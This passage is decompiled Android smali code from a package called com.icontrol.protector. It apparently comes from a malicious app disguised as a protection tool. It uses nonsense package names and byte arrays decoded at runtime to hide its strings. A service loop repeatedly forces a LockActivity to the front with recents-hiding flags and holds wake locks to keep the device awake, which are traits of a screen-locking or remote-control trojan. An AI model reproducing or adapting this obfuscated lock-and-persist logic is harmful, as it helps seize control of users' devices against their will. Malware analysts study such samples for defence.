    iget-boolean v8, p0, Lcom/icontrol/protector/WorkServices$d;->a:Z

    if-eqz v8, :cond_a

    const-wide/16 v8, 0x3e8

    :try_start_0
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    :catch_1
    iget-boolean v8, p0, Lcom/icontrol/protector/WorkServices$d;->a:Z

    if-nez v8, :cond_2

    goto/16 :goto_6

    :cond_2
    :try_start_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    sub-long/2addr v8, v2

    sget v10, Lntidisestablish/neumonoul/floccinaucinih/ab;->b:I

    int-to-long v10, v10

    cmp-long v8, v8, v10

    const/4 v9, 0x4

    if-ltz v8, :cond_3

    const/16 v8, 0xb

    new-array v8, v8, [B

    fill-array-data v8, :array_2

    new-array v10, v7, [B

    fill-array-data v10, :array_3

    invoke-static {v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v8, v9, [B

    fill-array-data v8, :array_4

    new-array v10, v7, [B

    fill-array-data v10, :array_5

    invoke-static {v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-static {p1}, Lcom/icontrol/protector/WorkServices;->l(Landroid/content/Context;)V

    invoke-static {p1}, Lcom/icontrol/protector/WorkServices$d;->c(Landroid/content/Context;)V

    goto :goto_1

    :catch_2
    move-exception v8

    goto/16 :goto_5

    :cond_3
    :goto_1
    iget-boolean v8, v5, Lntidisestablish/neumonoul/floccinaucinih/y9;->g:Z

    if-eqz v8, :cond_4

    invoke-static {p1}, Lcom/icontrol/protector/n;->U(Landroid/content/Context;)Z

    move-result v8

    if-eqz v8, :cond_4

    iget-boolean v8, v5, Lntidisestablish/neumonoul/floccinaucinih/y9;->b:Z

    if-nez v8, :cond_4

    invoke-direct {p0, p1}, Lcom/icontrol/protector/WorkServices$d;->m(Landroid/content/Context;)V

    :cond_4
    sget-object v8, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v10, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_5

    new-instance v8, Landroid/content/Intent;

    const-class v10, Lcom/icontrol/protector/LockActivity;

    invoke-direct {v8, p1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v10, 0x10000000

    invoke-virtual {v8, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v10, 0x10000

    invoke-virtual {v8, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v10, 0x20000

    invoke-virtual {v8, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v10, 0x20000000

    invoke-virtual {v8, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v8}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-array v8, v9, [B

    fill-array-data v8, :array_6

    new-array v9, v7, [B

    fill-array-data v9, :array_7

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v1}, Lcom/icontrol/protector/a;->q(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_2

    :cond_5
    invoke-static {}, Lcom/icontrol/protector/LockActivity;->b()Z

    move-result v8

    if-eqz v8, :cond_6

    invoke-static {}, Lcom/icontrol/protector/LockActivity;->a()V

    :cond_6
    :goto_2
    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    if-nez v8, :cond_8

    sget-object v8, Lcom/icontrol/protector/My_Configs;->Prevent_sleep:Ljava/lang/String;

    new-array v9, v4, [B

    const/16 v10, 0x7f

    aput-byte v10, v9, v0

    new-array v10, v7, [B

    fill-array-data v10, :array_8

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_7

    new-array v8, v4, [B

    const/16 v9, -0x33

    aput-byte v9, v8, v0

    new-array v9, v7, [B

    fill-array-data v9, :array_9

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const v9, 0x3000001a

    invoke-virtual {v6, v9, v8}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    :goto_3
    invoke-static {v8}, Lcom/icontrol/protector/WorkServices;->n(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    goto :goto_4

    :cond_7
    const/4 v8, 0x7

    new-array v8, v8, [B

    fill-array-data v8, :array_a

    new-array v9, v7, [B

    fill-array-data v9, :array_b

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const v9, 0x20000001

    invoke-virtual {v6, v9, v8}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    goto :goto_3

    :cond_8
    :goto_4
    invoke-static {p1}, Lcom/icontrol/protector/n;->i(Landroid/content/Context;)Z

    move-result v8

    if-nez v8, :cond_9

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    if-eqz v8, :cond_9

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v8

    if-eqz v8, :cond_9

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_9
    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    if-eqz v8, :cond_1

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v8

    if-nez v8, :cond_1

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    goto/16 :goto_0

    :goto_5
    const/16 v9, 0xc

    :try_start_2
    new-array v9, v9, [B

    fill-array-data v9, :array_c

    new-array v10, v7, [B

    fill-array-data v10, :array_d

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/Throwable;->printStackTrace()V

    const-wide/16 v8, 0x1

    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    :cond_a
    :goto_6
    sget-object p1, Lcom/icontrol/protector/WorkServices;->p:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {p1}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    return-object v1

    nop

    :array_0
    .array-data 1
        -0x5dt
        0x4t
        -0xdt
        0x71t
        0x48t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x2dt
        0x6bt
        -0x7ct
        0x14t
        0x3at
        -0xat
        0x24t
        -0xft
    .end array-data

    :array_2
    .array-data 1
        -0x4at
        -0x18t
        -0x11t
        -0x74t
        -0x3at
        0x13t
        -0x1at
        0x42t
        -0x64t
        -0x7t
        -0x4dt
    .end array-data

    :array_3
    .array-data 1
        -0x9t
        -0x64t
        -0x3ft
        -0x3ft
        -0x41t
        0x44t
        -0x77t
        0x30t
    .end array-data

    :array_4
    .array-data 1
        -0x22t
        0x44t
        -0xct
        0xdt
    .end array-data

    :array_5
    .array-data 1
        -0x72t
        0x2dt
        -0x66t
        0x6at
        -0x2dt
        0x4at
        0x56t
        -0x59t
    .end array-data

    :array_6
    .array-data 1
        0x4at
        0x54t
        -0x3at
        -0x1et
    .end array-data

    :array_7
    .array-data 1
        0x26t
        0x3bt
        -0x5bt
        -0x77t
        0x17t
        0x42t
        -0x76t
        0x24t
    .end array-data

    :array_8
    .array-data 1
        0x4et
        -0x78t
        0x11t
        -0x76t
        -0x34t
        -0x1ft
        0x54t
        -0x5et
    .end array-data

    :array_9
    .array-data 1
        -0x9t
        -0x2bt
        0x42t
        -0x72t
        -0x59t
        -0x34t
        -0x5et
        -0x13t
    .end array-data

    :array_a
    .array-data 1
        -0x21t
        0x1ct
        0x2bt
        0x4t
        -0x26t
        -0x3ct
        -0x11t
    .end array-data

    :array_b
    .array-data 1
        -0x58t
        0x7dt
        0x40t
        0x61t
        -0x20t
        -0x6dt
        -0x7ct
        -0x7dt
    .end array-data

    :array_c
    .array-data 1
        0x22t
        0xat
        -0x12t
        -0x33t
        -0x75t
        0x6at
        -0x35t
        -0x5t
        0x1t
        0x30t
        -0x51t
        -0x1at
    .end array-data

    :array_d
    .array-data 1
        0x75t
        0x59t
        -0x40t
        -0x78t
        -0xdt
        0x9t
        -0x52t
        -0x75t
    .end array-data
.end method

.method protected n(Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    sget-object p1, Lcom/icontrol/protector/WorkServices;->p:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {p1}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    invoke-virtual {p0}, Lcom/icontrol/protector/WorkServices$d;->o()V

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    if-eqz p1, :cond_0

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result p1

    if-eqz p1, :cond_0

    invoke-static {}, Lcom/icontrol/protector/WorkServices;->m()Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    return-void
.end method

.method public o()V
    .locals 1

    .line 1
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/WorkServices$d;->a:Z

    return-void
.end method

.method protected onCancelled()V
    .locals 0

    invoke-super {p0}, Landroid/os/AsyncTask;->onCancelled()V

    return-void
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/icontrol/protector/WorkServices$d;->n(Ljava/lang/String;)V

    return-void
.end method
